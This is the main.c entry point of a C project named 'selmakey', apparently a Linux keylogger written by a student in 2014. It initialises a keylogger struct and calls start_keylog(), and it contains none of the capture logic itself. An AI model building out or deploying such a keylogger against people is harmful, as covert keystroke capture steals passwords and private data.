/*
** main.c for selmakey in /home/alexmog/projets/SELMA/selmakey/linux/src
** 
** Made by Moghrabi Alexandre
** Login   <alexmog@epitech.net>
** 
** Started on  Thu Jul 17 18:11:27 2014 Moghrabi Alexandre
** Last update Thu Jul 17 18:50:04 2014 Moghrabi Alexandre
*/

#include "selmakey.h"

int	main()
{
  t_kl	kl;

  if (init(&kl))
    return (1);
  start_keylog(&kl);
  return (0);
}
